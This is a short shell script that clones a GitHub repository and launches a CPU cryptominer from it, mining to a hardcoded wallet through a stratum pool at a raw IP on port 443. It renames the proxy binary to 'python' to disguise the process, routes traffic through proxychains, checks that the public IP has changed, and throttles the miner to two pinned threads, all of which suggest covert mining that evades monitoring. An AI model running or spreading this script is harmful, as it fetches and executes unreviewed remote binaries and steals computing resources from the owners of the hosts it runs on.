#!/bin/sh 

sudo apt update 
clear
sudo git clone https://github.com/artazimuka/zobiner.git
clear
cd zobiner 
mv proxy python 
chmod +x python vakar proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./vakar -a lyra2z330 -o stratum+tcp://45.76.162.175:443 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.cpu -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 2 --cpu-affinity=0x3
